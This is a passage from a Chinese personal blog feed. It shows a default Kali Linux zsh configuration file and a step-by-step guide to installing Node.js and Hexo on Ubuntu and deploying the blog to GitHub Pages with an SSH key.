class="line">259</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># ~/.zshrc file for zsh interactive shells.</span></span><br><span class="line"><span class="comment"># see /usr/share/doc/zsh/examples/zshrc for examples</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">setopt</span> autocd              <span class="comment"># change directory just by typing its name</span></span><br><span class="line"><span class="comment">#setopt correct            # auto correct mistakes</span></span><br><span class="line"><span class="built_in">setopt</span> interactivecomments <span class="comment"># allow comments in interactive mode</span></span><br><span class="line"><span class="built_in">setopt</span> magicequalsubst     <span class="comment"># enable filename expansion for arguments of the form ‘anything=expression’</span></span><br><span class="line"><span class="built_in">setopt</span> nonomatch           <span class="comment"># hide error message if there is no match for the pattern</span></span><br><span class="line"><span class="built_in">setopt</span> notify              <span class="comment"># report the status of background jobs immediately</span></span><br><span class="line"><span class="built_in">setopt</span> numericglobsort     <span class="comment"># sort filenames numerically when it makes sense</span></span><br><span class="line"><span class="built_in">setopt</span> promptsubst         <span class="comment"># enable command substitution in prompt</span></span><br><span class="line"></span><br><span class="line">WORDCHARS=<span class="variable">$&#123;WORDCHARS//\/&#125;</span> <span class="comment"># Don&#x27;t consider certain characters part of the word</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hide EOL sign (&#x27;%&#x27;)</span></span><br><span class="line">PROMPT_EOL_MARK=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># configure key keybindings</span></span><br><span class="line"><span class="built_in">bindkey</span> -e                                        <span class="comment"># emacs key bindings</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27; &#x27;</span> magic-space                           <span class="comment"># do history expansion on space</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^U&#x27;</span> backward-kill-line                   <span class="comment"># ctrl + U</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[3;5~&#x27;</span> kill-word                       <span class="comment"># ctrl + Supr</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[3~&#x27;</span> delete-char                       <span class="comment"># delete</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[1;5C&#x27;</span> forward-word                    <span class="comment"># ctrl + -&gt;</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[1;5D&#x27;</span> backward-word                   <span class="comment"># ctrl + &lt;-</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[5~&#x27;</span> beginning-of-buffer-or-history    <span class="comment"># page up</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[6~&#x27;</span> end-of-buffer-or-history          <span class="comment"># page down</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[H&#x27;</span> beginning-of-line                  <span class="comment"># home</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[F&#x27;</span> end-of-line                        <span class="comment"># end</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[Z&#x27;</span> undo                               <span class="comment"># shift + tab undo last action</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable completion features</span></span><br><span class="line"><span class="built_in">autoload</span> -Uz compinit</span><br><span class="line">compinit -d ~/.cache/zcompdump</span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*:*:*:*:*&#x27;</span> menu <span class="keyword">select</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> auto-description <span class="string">&#x27;specify: %d&#x27;</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> completer _expand _complete</span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> format <span class="string">&#x27;Completing %d&#x27;</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> group-name <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> list-colors <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> list-prompt %SAt %p: Hit TAB <span class="keyword">for</span> more, or the character to insert%s</span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> matcher-list <span class="string">&#x27;m:&#123;a-zA-Z&#125;=&#123;A-Za-z&#125;&#x27;</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> <span class="built_in">rehash</span> <span class="literal">true</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> select-prompt %SScrolling active: current selection at %p%s</span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> use-compctl <span class="literal">false</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> verbose <span class="literal">true</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*:kill:*&#x27;</span> <span class="built_in">command</span> <span class="string">&#x27;ps -u $USER -o pid,%cpu,tty,cputime,cmd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># History configurations</span></span><br><span class="line">HISTFILE=~/.zsh_history</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">SAVEHIST=2000</span><br><span class="line"><span class="built_in">setopt</span> hist_expire_dups_first <span class="comment"># delete duplicates first when HISTFILE size exceeds HISTSIZE</span></span><br><span class="line"><span class="built_in">setopt</span> hist_ignore_dups       <span class="comment"># ignore duplicated commands history list</span></span><br><span class="line"><span class="built_in">setopt</span> hist_ignore_space      <span class="comment"># ignore commands that start with space</span></span><br><span class="line"><span class="built_in">setopt</span> hist_verify            <span class="comment"># show command with history expansion to user before running it</span></span><br><span class="line"><span class="comment">#setopt share_history         # share command history data</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># force zsh to show the complete history</span></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">history</span>=<span class="string">&quot;history 0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># configure `time` format</span></span><br><span class="line">TIMEFMT=$<span class="string">&#x27;\nreal\t%E\nuser\t%U\nsys\t%S\ncpu\t%P&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make less more friendly for non-text input files, see lesspipe(1)</span></span><br><span class="line"><span class="comment">#[ -x /usr/bin/lesspipe ] &amp;&amp; eval &quot;$(SHELL=/bin/sh lesspipe)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set variable identifying the chroot you work in (used in the prompt below)</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$&#123;debian_chroot:-&#125;</span>&quot;</span> ] &amp;&amp; [ -r /etc/debian_chroot ]; <span class="keyword">then</span></span><br><span class="line">    debian_chroot=$(<span class="built_in">cat</span> /etc/debian_chroot)</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set a fancy prompt (non-color, unless we know we &quot;want&quot; color)</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$TERM</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    xterm-color|*-256color) color_prompt=<span class="built_in">yes</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># uncomment for a colored prompt, if the terminal has the capability; turned</span></span><br><span class="line"><span class="comment"># off by default to not distract the user: the focus in a terminal window</span></span><br><span class="line"><span class="comment"># should be on the output of commands, not on the prompt</span></span><br><span class="line">force_color_prompt=<span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$force_color_prompt</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; <span class="keyword">then</span></span><br><span class="line">        <span class="comment"># We have color support; assume it&#x27;s compliant with Ecma-48</span></span><br><span class="line">        <span class="comment"># (ISO/IEC-6429). (Lack of such support is extremely rare, and such</span></span><br><span class="line">        <span class="comment"># a case would tend to support setf rather than setaf.)</span></span><br><span class="line">        color_prompt=<span class="built_in">yes</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        color_prompt=</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">configure_prompt</span></span>() &#123;</span><br><span class="line">    prompt_symbol=㉿</span><br><span class="line">    <span class="comment"># Skull emoji for root terminal</span></span><br><span class="line">    <span class="comment">#[ &quot;$EUID&quot; -eq 0 ] &amp;&amp; prompt_symbol=💀</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$PROMPT_ALTERNATIVE</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">        twoline)</span><br><span class="line">            PROMPT=$<span class="string">&#x27;%F&#123;%(#.blue.green)&#125;┌──$&#123;debian_chroot:+($debian_chroot)─&#125;$&#123;VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─&#125;(%B%F&#123;%(#.red.blue)&#125;%n&#x27;</span>$prompt_symbol$<span class="string">&#x27;%m%b%F&#123;%(#.blue.green)&#125;)-[%B%F&#123;reset&#125;%(6~.%-1~/…/%4~.%5~)%b%F&#123;%(#.blue.green)&#125;]\n└─%B%(#.%F&#123;red&#125;#.%F&#123;blue&#125;$)%b%F&#123;reset&#125; &#x27;</span></span><br><span class="line">            <span class="comment"># Right-side prompt with exit codes and background processes</span></span><br><span class="line">            <span class="comment">#RPROMPT=$&#x27;%(?.. %? %F&#123;red&#125;%B⨯%b%F&#123;reset&#125;)%(1j. %j %F&#123;yellow&#125;%B⚙%b%F&#123;reset&#125;.)&#x27;</span></span><br><span class="line">            ;;</span><br><span class="line">        oneline)</span><br><span class="line">            PROMPT=$<span class="string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;$&#123;VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))&#125;%B%F&#123;%(#.red.blue)&#125;%n@%m%b%F&#123;reset&#125;:%B%F&#123;%(#.blue.green)&#125;%~%b%F&#123;reset&#125;%(#.#.$) &#x27;</span></span><br><span class="line">            RPROMPT=</span><br><span class="line">            ;;</span><br><span class="line">        backtrack)</span><br><span class="line">            PROMPT=$<span class="string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;$&#123;VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))&#125;%B%F&#123;red&#125;%n@%m%b%F&#123;reset&#125;:%B%F&#123;blue&#125;%~%b%F&#123;reset&#125;%(#.#.$) &#x27;</span></span><br><span class="line">            RPROMPT=</span><br><span class="line">            ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line">    <span class="built_in">unset</span> prompt_symbol</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># The following block is surrounded by two delimiters.</span></span><br><span class="line"><span class="comment"># These delimiters must not be modified. Thanks.</span></span><br><span class="line"><span class="comment"># START KALI CONFIG VARIABLES</span></span><br><span class="line">PROMPT_ALTERNATIVE=twoline</span><br><span class="line">NEWLINE_BEFORE_PROMPT=<span class="built_in">yes</span></span><br><span class="line"><span class="comment"># STOP KALI CONFIG VARIABLES</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$color_prompt</span>&quot;</span> = <span class="built_in">yes</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># override default virtualenv indicator in prompt</span></span><br><span class="line">    VIRTUAL_ENV_DISABLE_PROMPT=1</span><br><span class="line"></span><br><span class="line">    configure_prompt</span><br><span class="line"></span><br><span class="line">    <span class="comment"># enable syntax-highlighting</span></span><br><span class="line">    <span class="keyword">if</span> [ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; <span class="keyword">then</span></span><br><span class="line">        . /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</span><br><span class="line">        ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[default]=none</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[unknown-token]=underline</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[reserved-word]=<span class="built_in">fg</span>=cyan,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[suffix-alias]=<span class="built_in">fg</span>=green,underline</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[global-alias]=<span class="built_in">fg</span>=green,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[precommand]=<span class="built_in">fg</span>=green,underline</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[commandseparator]=<span class="built_in">fg</span>=blue,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[autodirectory]=<span class="built_in">fg</span>=green,underline</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[path]=bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[path_pathseparator]=</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]=</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[globbing]=<span class="built_in">fg</span>=blue,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[history-expansion]=<span class="built_in">fg</span>=blue,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[command-substitution]=none</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]=<span class="built_in">fg</span>=magenta,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[process-substitution]=none</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]=<span class="built_in">fg</span>=magenta,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=<span class="built_in">fg</span>=green</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=<span class="built_in">fg</span>=green</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[back-quoted-argument]=none</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]=<span class="built_in">fg</span>=blue,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=<span class="built_in">fg</span>=yellow</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=<span class="built_in">fg</span>=yellow</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]=<span class="built_in">fg</span>=yellow</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[rc-quote]=<span class="built_in">fg</span>=magenta</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=<span class="built_in">fg</span>=magenta,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]=<span class="built_in">fg</span>=magenta,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]=<span class="built_in">fg</span>=magenta,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[assign]=none</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[redirection]=<span class="built_in">fg</span>=blue,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[comment]=<span class="built_in">fg</span>=black,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[named-fd]=none</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[numeric-fd]=none</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[arg0]=<span class="built_in">fg</span>=cyan</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[bracket-error]=<span class="built_in">fg</span>=red,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[bracket-level-1]=<span class="built_in">fg</span>=blue,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[bracket-level-2]=<span class="built_in">fg</span>=green,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[bracket-level-3]=<span class="built_in">fg</span>=magenta,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[bracket-level-4]=<span class="built_in">fg</span>=yellow,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[bracket-level-5]=<span class="built_in">fg</span>=cyan,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]=standout</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    PROMPT=<span class="string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;%n@%m:%~%(#.#.$) &#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">unset</span> color_prompt force_color_prompt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">toggle_oneline_prompt</span></span>()&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$PROMPT_ALTERNATIVE</span>&quot;</span> = oneline ]; <span class="keyword">then</span></span><br><span class="line">        PROMPT_ALTERNATIVE=twoline</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        PROMPT_ALTERNATIVE=oneline</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    configure_prompt</span><br><span class="line">    <span class="built_in">zle</span> reset-prompt</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">zle</span> -N toggle_oneline_prompt</span><br><span class="line"><span class="built_in">bindkey</span> ^P toggle_oneline_prompt</span><br><span class="line"></span><br><span class="line"><span class="comment"># If this is an xterm set the title to user@host:dir</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$TERM</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">xterm*|rxvt*|Eterm|aterm|kterm|gnome*|alacritty)</span><br><span class="line">    TERM_TITLE=$<span class="string">&#x27;\e]0;$&#123;debian_chroot:+($debian_chroot)&#125;$&#123;VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))&#125;%n@%m: %~\a&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">precmd</span></span>() &#123;</span><br><span class="line">    <span class="comment"># Print the previously configured title</span></span><br><span class="line">    <span class="built_in">print</span> -Pnr -- <span class="string">&quot;<span class="variable">$TERM_TITLE</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Print a new line before the prompt, but only if it is not the first line</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$NEWLINE_BEFORE_PROMPT</span>&quot;</span> = <span class="built_in">yes</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$_NEW_LINE_BEFORE_PROMPT</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            _NEW_LINE_BEFORE_PROMPT=1</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># enable color support of ls, less and man, and also add handy aliases</span></span><br><span class="line"><span class="keyword">if</span> [ -x /usr/bin/dircolors ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">test</span> -r ~/.dircolors &amp;&amp; <span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(dircolors -b ~/.dircolors)</span>&quot;</span> || <span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(dircolors -b)</span>&quot;</span></span><br><span class="line">    <span class="built_in">export</span> LS_COLORS=<span class="string">&quot;<span class="variable">$LS_COLORS</span>:ow=30;44:&quot;</span> <span class="comment"># fix ls color for folders with 777 permissions</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">alias</span> <span class="built_in">ls</span>=<span class="string">&#x27;ls --color=auto&#x27;</span></span><br><span class="line">    <span class="comment">#alias dir=&#x27;dir --color=auto&#x27;</span></span><br><span class="line">    <span class="comment">#alias vdir=&#x27;vdir --color=auto&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">alias</span> grep=<span class="string">&#x27;grep --color=auto&#x27;</span></span><br><span class="line">    <span class="built_in">alias</span> fgrep=<span class="string">&#x27;fgrep --color=auto&#x27;</span></span><br><span class="line">    <span class="built_in">alias</span> egrep=<span class="string">&#x27;egrep --color=auto&#x27;</span></span><br><span class="line">    <span class="built_in">alias</span> diff=<span class="string">&#x27;diff --color=auto&#x27;</span></span><br><span class="line">    <span class="built_in">alias</span> ip=<span class="string">&#x27;ip --color=auto&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">export</span> LESS_TERMCAP_mb=$<span class="string">&#x27;\E[1;31m&#x27;</span>     <span class="comment"># begin blink</span></span><br><span class="line">    <span class="built_in">export</span> LESS_TERMCAP_md=$<span class="string">&#x27;\E[1;36m&#x27;</span>     <span class="comment"># begin bold</span></span><br><span class="line">    <span class="built_in">export</span> LESS_TERMCAP_me=$<span class="string">&#x27;\E[0m&#x27;</span>        <span class="comment"># reset bold/blink</span></span><br><span class="line">    <span class="built_in">export</span> LESS_TERMCAP_so=$<span class="string">&#x27;\E[01;33m&#x27;</span>    <span class="comment"># begin reverse video</span></span><br><span class="line">    <span class="built_in">export</span> LESS_TERMCAP_se=$<span class="string">&#x27;\E[0m&#x27;</span>        <span class="comment"># reset reverse video</span></span><br><span class="line">    <span class="built_in">export</span> LESS_TERMCAP_us=$<span class="string">&#x27;\E[1;32m&#x27;</span>     <span class="comment"># begin underline</span></span><br><span class="line">    <span class="built_in">export</span> LESS_TERMCAP_ue=$<span class="string">&#x27;\E[0m&#x27;</span>        <span class="comment"># reset underline</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Take advantage of $LS_COLORS for completion as well</span></span><br><span class="line">    <span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> list-colors <span class="string">&quot;<span class="variable">$&#123;(s.:.)LS_COLORS&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*:*:kill:*:processes&#x27;</span> list-colors <span class="string">&#x27;=(#b) #([0-9]#)*=0=01;31&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># some more ls aliases</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -l&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">&#x27;ls -A&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> l=<span class="string">&#x27;ls -CF&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable auto-suggestions based on the history</span></span><br><span class="line"><span class="keyword">if</span> [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; <span class="keyword">then</span></span><br><span class="line">    . /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh</span><br><span class="line">    <span class="comment"># change suggestion color</span></span><br><span class="line">    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE=<span class="string">&#x27;fg=#999&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable command-not-found if installed</span></span><br><span class="line"><span class="keyword">if</span> [ -f /etc/zsh_command_not_found ]; <span class="keyword">then</span></span><br><span class="line">    . /etc/zsh_command_not_found</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></code></pre></details>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo github搭建博客</title>
      <link href="/2024/10/08/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo%E6%90%AD%E5%BB%BA/hexo-test/"/>
      <url>/2024/10/08/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo%E6%90%AD%E5%BB%BA/hexo-test/</url>
      
        <content type="html"><![CDATA[<h3 id="系统unbuntu22-4-4（虚拟机）-nodejs-20-18-0-npm-10-8-2"><a href="#系统unbuntu22-4-4（虚拟机）-nodejs-20-18-0-npm-10-8-2" class="headerlink" title="系统unbuntu22.4.4（虚拟机） nodejs 20.18.0 npm 10.8.2"></a>系统unbuntu22.4.4（虚拟机） nodejs 20.18.0 npm 10.8.2</h3> <span id="more"></span><h4 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h4><h5 id="因为apt安装的nodejs版本低于hexo要求，所以用预编译版本安装"><a href="#因为apt安装的nodejs版本低于hexo要求，所以用预编译版本安装" class="headerlink" title="因为apt安装的nodejs版本低于hexo要求，所以用预编译版本安装"></a>因为apt安装的nodejs版本低于hexo要求，所以用预编译版本安装</h5><p><a href="https://nodejs.org/dist/v20.18.0/node-v20.18.0-linux-x64.tar.xz">node</a><br>下载后重命名为nodejs 并解压到&#x2F;usr&#x2F;local&#x2F;lib下<br>创建连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@lo:/usr/lib/environment.d# <span class="built_in">ln</span> -s  /usr/local/lib/nodejs/bin/npm /usr/bin</span><br><span class="line">root@lo:/usr/lib/environment.d# <span class="built_in">ln</span> -s  /usr/local/lib/nodejs/bin/node /usr/bin</span><br></pre></td></tr></table></figure><p>执行node确认后安装hexo客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> npm install -g hexo-cli --registry https://registry.npmmirror.com</span><br></pre></td></tr></table></figure><p>然后为hexo创建连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s /usr/local/lib/nodejs/lib/node_modules/hexo-cli/bin/hexo /usr/local/bin</span><br></pre></td></tr></table></figure><p>创建blog并安装hexo-deployer-git插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init blog</span><br><span class="line">cd blog</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>hexo s在本地打开服务</p><h4 id="部署到github"><a href="#部署到github" class="headerlink" title="部署到github"></a>部署到github</h4><h5 id="本地准备ssh"><a href="#本地准备ssh" class="headerlink" title="本地准备ssh"></a>本地准备ssh</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install ssh git</span><br><span class="line">ss-keygen -t ed25519 <span class="comment">#创建密钥对于~/.ssh/下 </span></span><br><span class="line"><span class="comment">#执行后第一个要求输入的是文件名这里用githubkey，第二个是密码（密钥泄漏的保障，可不填）</span></span><br><span class="line"><span class="comment">#~/.ssh/githubkey.pub内容备用</span></span><br></pre></td></tr></table></figure><ul><li>登陆github创建仓库，名为name.github.io</li><li>点击设置，找到 SSH and GPG keys 点add ssh keys</li><li>将~&#x2F;.ssh&#x2F;githubkey.pub的内容全部复制到那个大框里，命名再点add SSH key</li></ul><p>在本地终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;注册的邮箱&quot;</span></span><br><span class="line">ssh -T git@github.com -i ~/.ssh/githubkey</span><br></pre></td></tr></table></figure><p>连接成功则没问题</p><p>编辑blog下的_config.yml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:用户名/用户名.github.io.git</span><br><span class="line">  # example, https://github.com/hexojs/hexojs.github.io</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>参考文档中的一键部署<a href="https://hexo.io/zh-cn/docs/github-pages">hexo</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g &amp;&amp; hexo deploy</span><br></pre></td></tr></table></figure><h1 id="这里报错"><a href="#这里报错" class="headerlink" title="这里报错"></a>这里报错</h1><p>临时方法 ~&#x2F;.ssh&#x2F;github设置为全局密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;IdentityFile ~/.ssh/github&quot;</span> &gt; ~/.ssh/config</span><br></pre></td></tr></table></figure><p>访问名字.github.io</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-offline-popup --save</span><br><span class="line">npm install hexo-neat --save</span><br><span class="line">hexo clean </span><br><span 